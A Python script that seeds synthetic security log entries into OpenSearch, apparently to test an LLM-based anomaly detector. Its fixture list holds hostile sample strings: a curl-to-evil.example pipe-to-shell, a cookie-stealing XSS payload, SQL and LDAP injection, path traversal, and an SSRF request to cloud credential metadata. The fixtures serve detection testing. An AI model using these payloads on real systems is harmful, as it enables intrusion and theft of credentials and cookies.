"""Seed synthetic *security* / attack-pattern logs into OpenSearch for LLM anomaly testing.

Templates map to the MITRE / OWASP-style taxonomy in ``loggator/llm/prompts.py`` (anomaly + batch).

  docker compose -f docker-compose.local.yml exec api python scripts/seed_attack_logs.py

Env: same as ``seed_logs.py`` (OPENSEARCH_HOST, OPENSEARCH_PORT, LOG_SEED_INDEX).
     Default index: logs-attack-local (still matches logs-*).
"""
import asyncio
import os
import random
import uuid
from datetime import datetime, timedelta, timezone

from opensearchpy import AsyncOpenSearch


def _env_bool(key: str, default: bool) -> bool:
    v = os.environ.get(key)
    if v is None:
        return default
    return v.strip().lower() in ("1", "true", "yes")


INDEX = os.environ.get("LOG_SEED_INDEX", "logs-attack-local")
OS_HOST = os.environ.get("OPENSEARCH_HOST", "localhost")
OS_PORT = int(os.environ.get("OPENSEARCH_PORT", "9200"))
OS_USE_SSL = _env_bool("OPENSEARCH_USE_SSL", False)
OS_VERIFY = _env_bool("OPENSEARCH_VERIFY_CERTS", True)

# (level, message) — explicit TTP-flavoured strings the anomaly prompt looks for
ATTACK_LINES = [
    ("ERROR", "auth-service: 12 failed login attempts in 60s for user admin from src_ip=185.220.101.44 — possible T1110 brute force"),
    ("WARN", "api-gateway: repeated 401/403 for /api/v1/admin from 185.220.101.44 after credential stuffing pattern"),
    ("ERROR", "api-gateway: SQL syntax error near 'UNION SELECT username,password FROM users--' in query param id="),
    ("ERROR", "user-service: path traversal blocked: request URI contained %2e%2e%2fetc%2fpasswd"),
    ("ERROR", "payment-service: SSRF blocked — outbound fetch to http://169.254.169.254/latest/meta-data/iam/security-credentials/ denied"),
    ("WARN", "api-gateway: shell metacharacters in User-Agent: ; curl http://evil.example/payload.sh | sh"),
    ("ERROR", "order-service: detected template probe in body: ${{7*7}} and <%=7*7%> — possible server-side template injection"),
    ("ERROR", "Secrets scanner: log line contained AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE — credential exposure T1552"),
    ("WARN", "k8s-audit: system:anonymous successfully listed secrets in namespace kube-system — T1078.001 default/anonymous access"),
    ("ERROR", "container-runtime: process nsenter attempted with --target=1 — possible container escape T1611"),
    ("WARN", "worker-node-3: docker.sock mounted at /var/run/docker.sock — privileged workload policy violation"),
    ("ERROR", "edge-proxy: sequential connect scan from 10.0.5.88 to ports 22,3306,5432,6379,9200 within 8s — T1046"),
    ("WARN", "dns-resolver: burst of 400 queries for random-label-xxxxxxxxxxxx.attacker.example from single host — possible DNS tunnel T1048"),
    ("ERROR", "vpn-gateway: new internal pairing 10.0.5.88 -> 10.0.20.15 across 6 services in 90s — lateral movement T1021"),
    ("WARN", "waf: XSS attempt blocked: <script>document.location='https://evil.example/steal?c='+document.cookie</script>"),
    ("ERROR", "ldap-bridge: filter contained *)(&(|(objectClass=*)) — LDAP injection pattern"),
    ("CRITICAL", "file-integrity: mass encryption extension .locked observed on /data/shares — possible ransomware activity"),
    ("WARN", "siem-correlation: beaconing — outbound HTTPS every 300s±2s from host payroll-db-01 to 45.33.32.156"),
]

SERVICES = [
    "auth-service", "api-gateway", "user-service", "payment-service",
    "order-service", "edge-proxy", "container-runtime", "k8s-audit",
]


def _doc(level: str, message: str, service: str, ts: datetime, src_ip: str) -> dict:
    return {
        "@timestamp": ts.isoformat(),
        "level": level,
        "message": message,
        "service": service,
        "host": f"{service}-{uuid.uuid4().hex[:6]}",
        "src_ip": src_ip,
        "environment": "production",
        "trace_id": f"atk-{uuid.uuid4().hex[:12]}",
    }


async def seed():
    client = AsyncOpenSearch(
        hosts=[{"host": OS_HOST, "port": OS_PORT}],
        use_ssl=OS_USE_SSL,
        verify_certs=OS_VERIFY,
    )

    if not await client.indices.exists(index=INDEX):
        await client.indices.create(
            index=INDEX,
            body={"mappings": {"properties": {"@timestamp": {"type": "date"}}}},
        )
        print(f"Created index: {INDEX}")

    now = datetime.now(timezone.utc)
    bulk: list = []
    docs_count = 0

    # Recent burst (last 8 min) — easy for batch window + streaming
    print("  [1/2] Attack burst (last 8 minutes)...")
    for _ in range(85):
        ts = now - timedelta(seconds=random.randint(0, 480))
        level, msg = random.choice(ATTACK_LINES)
        svc = random.choice(SERVICES)
        if "auth" in msg.lower() or "brute" in msg.lower():
            svc = "auth-service"
        elif "sql" in msg.lower() or "union" in msg.lower():
            svc = "api-gateway"
        ip = f"185.220.{random.randint(1, 255)}.{random.randint(1, 255)}"
        d = _doc(level, msg, svc, ts, ip)
        bulk.extend([{"index": {"_index": INDEX}}, d])
        docs_count += 1

    # Background (last 6 hours) — sustained campaign noise
    print("  [2/2] Background attack-related events (last 6 hours)...")
    for _ in range(60):
        ts = now - timedelta(minutes=random.randint(9, 360))
        level, msg = random.choice(ATTACK_LINES)
        svc = random.choice(SERVICES)
        ip = f"10.0.{random.randint(1, 50)}.{random.randint(1, 250)}"
        bulk.extend([{"index": {"_index": INDEX}}, _doc(level, msg, svc, ts, ip)])
        docs_count += 1

    resp = await client.bulk(body=bulk, refresh=True)
    errors = [i for i in resp["items"] if "error" in i.get("index", {})]
    ok = docs_count - len(errors)
    print(f"Seeded {ok} attack-scenario logs into {INDEX} at {OS_HOST}:{OS_PORT} ({len(errors)} errors)")
    print("Next: POST /api/v1/batch/trigger or wait for scheduler; check Anomalies + Chat / Analyse.")
    await client.close()


if __name__ == "__main__":
    asyncio.run(seed())
